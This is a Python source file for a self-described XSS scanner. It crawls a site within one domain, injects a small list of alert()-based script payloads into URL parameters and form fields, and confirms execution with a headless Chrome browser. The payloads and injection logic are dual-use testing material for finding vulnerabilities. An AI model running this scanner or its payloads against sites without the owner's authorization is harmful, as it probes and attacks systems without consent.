# scanner.py (v2)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import argparse
import sys
import time
from collections import deque # For efficient queue operations in crawler

# Selenium imports for headless confirmation
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
# In a real tool, this would be much more extensive and context-aware
PAYLOADS = [
    "<script>alert('XSS1')</script>",
    "'><script>alert('XSS2')</script>",
    '" onmouseover="alert(\'XSS3\')">', # Less reliable for alert check
    "<img src=x onerror=alert('XSS4')>",
    "javascript:alert('XSS5')", # For href/src contexts
]
# Timeout for waiting for alert dialog in seconds
ALERT_WAIT_TIMEOUT = 3

# --- Helper Functions ---

def setup_driver():
    """Sets up the Selenium WebDriver."""
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless") # Run headless
    chrome_options.add_argument("--no-sandbox") # Often needed in Linux environments
    chrome_options.add_argument("--disable-dev-shm-usage") # Overcome limited resource problems
    chrome_options.add_argument("--disable-gpu") # Applicable to windows os only
    chrome_options.add_argument("--log-level=3") # Suppress console logs from Chrome/ChromeDriver
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging']) # Suppress DevTools logging

    try:
        # Use webdriver-manager to automatically download/manage ChromeDriver
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(10) # Don't wait forever for pages to load
        return driver
    except Exception as e:
        print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr)
        print("[!] Headless confirmation will be disabled.", file=sys.stderr)
        return None

def confirm_xss_with_headless(url, driver):
    """Uses Selenium to visit a URL and check for an alert dialog."""
    if not driver:
        return False # Headless confirmation disabled

    print(f"  [*] Attempting headless confirmation for: {url[:100]}...")
    try:
        driver.get(url)
        # Wait for an alert to appear
        WebDriverWait(driver, ALERT_WAIT_TIMEOUT).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        alert_text = alert.text # Optional: check alert text if needed
        print(f"  [+] CONFIRMED: JavaScript alert detected ('{alert_text}')!")
        alert.accept() # Close the alert
        return True
    except TimeoutException:
        # No alert appeared within the timeout - expected for non-vulnerable pages
        print("  [-] No alert detected within timeout.")
        return False
    except UnexpectedAlertPresentException:
        # Alert appeared unexpectedly (e.g., before explicit wait) - still counts!
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            print(f"  [+] CONFIRMED: Unexpected JavaScript alert detected ('{alert_text}')!")
            alert.accept()
            return True
        except NoAlertPresentException:
             print("  [!] Alert was present but disappeared before handling.", file=sys.stderr)
             return False # Or True depending on policy? Let's say False.
    except Exception as e:
        print(f"  [!] Error during headless confirmation for {url[:100]}: {e}", file=sys.stderr)
        return False

def get_links(url, session, base_domain):
    """Fetches and parses HTML to find all valid links on the same domain."""
    links = set()
    try:
        response = session.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            # Resolve relative URLs
            full_url = urljoin(url, href)
            # Basic cleanup: remove fragments and ensure it's HTTP/HTTPS
            parsed_link = urlparse(full_url)
            if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == base_domain:
                # Keep URL without fragment
                clean_url = parsed_link._replace(fragment='').geturl()
                links.add(clean_url)
        return links
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching links from {url}: {e}", file=sys.stderr)
        return set()
    except Exception as e:
        print(f"[!] Error parsing links from {url}: {e}", file=sys.stderr)
        return set()

def get_forms(url, session):
    """Fetches and parses HTML to find all forms."""
    try:
        response = session.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching forms from {url}: {e}", file=sys.stderr)
        return []
    except Exception as e:
        print(f"[!] Error parsing forms from {url}: {e}", file=sys.stderr)
        return []

def get_form_details(form):
    """Extracts details from a form element."""
    details = {}
    action = form.attrs.get('action', '').lower()
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all(['input', 'textarea', 'select']):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        # Handle case where input has no name attribute
        if input_name is None:
            continue # Skip inputs without names
        input_value = input_tag.attrs.get('value', '')
        inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form_and_check(form_details, url, payload, session, driver):
    """Submits a form with the payload and checks for reflection/execution."""
    target_url = urljoin(url, form_details['action'])
    inputs = form_details['inputs']
    data = {}
    tested_fields = []

    for input_item in inputs:
         # Check if name exists before assigning
        if not input_item.get('name'):
            continue

        # Inject payload into relevant input types
        if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea']:
            data[input_item['name']] = payload
            tested_fields.append(input_item['name'])
        else:
            data[input_item['name']] = input_item['value'] # Keep default value for others

    if not tested_fields: # No fields were suitable for injection
        return None

    try:
        response = None
        request_details = f"Form (Action: {form_details['action']}, Method: {form_details['method']}, Fields: {tested_fields})"
        print(f"[*] Testing {request_details} with payload...")

        if form_details['method'] == 'post':
            response = session.post(target_url, data=data, allow_redirects=True)
        else: # Default to GET
            response = session.get(target_url, params=data, allow_redirects=True)

        response_body = response.content.decode(errors='ignore')
        final_url = response.url # URL after redirects

        # 1. Basic Reflection Check (Optional, but good for debugging)
        if payload in response_body:
            print(f"  [+] Potential Reflection found in response from {request_details}")
            # 2. Headless Confirmation
            if confirm_xss_with_headless(final_url, driver):
                return {'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'payload': payload, 'confirmed': True, 'final_url': final_url}
            else:
                 # Reflection found, but not confirmed via alert
                 return {'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'payload': payload, 'confirmed': False, 'final_url': final_url}
        else:
            print(f"  [-] Payload not reflected in response from {request_details}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[!] Error submitting form to {target_url}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Unexpected error during form submission: {e}", file=sys.stderr)
        return None


def scan_url_params_and_check(url, payload, session, driver):
    """Tests injecting payload into URL parameters and checks for reflection/execution."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    results = []

    if not query_params:
        return results # No parameters to test

    print(f"[*] Testing URL parameters for {url}")
    for param_name in query_params.keys():
        if not query_params[param_name]: continue # Skip empty params

        original_value = query_params[param_name][0] # Simple case

        # Create modified query params with payload
        modified_params = query_params.copy()
        modified_params[param_name] = [payload] # Inject payload

        # Rebuild the URL
        modified_query = urlencode(modified_params, doseq=True)
        test_url = parsed_url._replace(query=modified_query).geturl()

        print(f"  - Testing param '{param_name}' with payload...")

        try:
            response = session.get(test_url, allow_redirects=True)
            response_body = response.content.decode(errors='ignore')
            final_url = response.url # URL after redirects

            # 1. Basic Reflection Check
            if payload in response_body:
                print(f"  [+] Potential Reflection found for param '{param_name}'")
                # 2. Headless Confirmation
                if confirm_xss_with_headless(final_url, driver):
                     results.append({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'payload': payload, 'confirmed': True, 'final_url': final_url})
                else:
                     results.append({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'payload': payload, 'confirmed': False, 'final_url': final_url})
            else:
                 print(f"  [-] Payload not reflected for param '{param_name}'")

        except requests.exceptions.RequestException as e:
             print(f"  [!] Error testing param '{param_name}': {e}", file=sys.stderr)
        except Exception as e:
             print(f"  [!] Unexpected error testing param '{param_name}': {e}", file=sys.stderr)

    return results


# --- Main Scanner Logic ---
def scan_page(url, session, driver):
    """Scans a single page for forms and URL parameters, attempting confirmation."""
    print(f"\n[*] Scanning {url}...")
    found_vulnerabilities = []

    # 1. Test URL Parameters (if any)
    for payload in PAYLOADS:
        results = scan_url_params_and_check(url, payload, session, driver)
        found_vulnerabilities.extend(results)

    # 2. Find and Test Forms
    forms = get_forms(url, session)
    print(f"[*] Found {len(forms)} forms on {url}")

    for form in forms:
        form_details = get_form_details(form)
        if not form_details['inputs']: # Skip forms with no inputs
             continue
        # Test each payload in the form
        for payload in PAYLOADS:
            result = submit_form_and_check(form_details, url, payload, session, driver)
            if result:
                found_vulnerabilities.append(result)
            # Optimization: Maybe stop testing this form/param if confirmed?
            # if result and result.get('confirmed'):
            #    break # Stop testing payloads for this specific form/param

    return found_vulnerabilities

# --- Crawler ---
def crawl(start_url, max_depth, session, driver):
    """Performs a breadth-first crawl and scan."""
    if max_depth <= 0: # Handle non-positive depth
        print("[!] Max depth must be positive. Scanning starting URL only.")
        max_depth = 1

    base_domain = urlparse(start_url).netloc
    if not base_domain:
        print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr)
        return

    # Use a deque for efficient queue operations (popleft)
    queue = deque([(start_url, 0)]) # Store (url, depth)
    visited = {start_url}
    all_vulnerabilities = []

    while queue:
        current_url, current_depth = queue.popleft()

        if current_depth >= max_depth:
            continue

        # Scan the current page
        vulnerabilities = scan_page(current_url, session, driver)
        all_vulnerabilities.extend(vulnerabilities)

        # Find new links to crawl
        if current_depth < max_depth - 1: # Only find links if we can go deeper
            print(f"[*] Discovering links on {current_url} (Depth {current_depth})...")
            new_links = get_links(current_url, session, base_domain)
            for link in new_links:
                if link not in visited:
                    visited.add(link)
                    queue.append((link, current_depth + 1))
                    print(f"  - Added to queue: {link} (Depth {current_depth + 1})")

    print(f"\n[*] Crawler finished. Visited {len(visited)} unique URLs.")
    return all_vulnerabilities


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner v2 (Crawler + Headless Confirmation) - Use Responsibly!")
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation (faster, less accurate)")
    # Add more arguments: --output, --cookies, --headers, --rate-limit etc.

    args = parser.parse_args()
    target_url = args.url
    max_depth = args.depth
    use_headless = not args.no_headless

    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver:
            print("[!] Proceeding without headless confirmation.")
            use_headless = False # Ensure flag matches reality
    else:
         print("[*] Headless confirmation disabled via command line.")


    # Use a session object
    session = requests.Session()
    session.headers.update({'User-Agent': 'XSSScanner/0.2 (github.com/your-repo)'}) # Update User-Agent

    start_time = time.time()

    # Start crawling and scanning
    all_found = crawl(target_url, max_depth, session, driver)

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")
    confirmed_vulns = [v for v in all_found if v.get('confirmed')]
    potential_vulns = [v for v in all_found if not v.get('confirmed')]

    if confirmed_vulns:
        print(f"\n[***] Found {len(confirmed_vulns)} CONFIRMED XSS vulnerabilities:")
        for vuln in confirmed_vulns:
            if vuln['type'] == 'URL Parameter':
                print(f"  - Type: {vuln['type']}, URL: {vuln['url']}, Parameter: {vuln['parameter']}, Payload: {vuln['payload']}, Final URL: {vuln['final_url']}")
            elif vuln['type'] == 'Form Input':
                 print(f"  - Type: {vuln['type']}, URL: {vuln['url']}, Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, Payload: {vuln['payload']}, Final URL: {vuln['final_url']}")
    else:
        print("\n[*] No vulnerabilities confirmed via headless browser alert().")

    if potential_vulns:
        print(f"\n[!] Found {len(potential_vulns)} potential reflection points (unconfirmed by alert()):")
        # Optionally print details for potential ones too
        # for vuln in potential_vulns:
        #    print(f"  - Type: {vuln['type']}, ... Payload: {vuln['payload']}")
        print("    (These require manual verification as no alert() dialog was detected)")

    if not confirmed_vulns and not potential_vulns:
         print("\n[*] No potential XSS reflections found with the current payloads and scan depth.")

    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup Selenium Driver
    if driver:
        print("[*] Closing headless browser...")
        driver.quit()

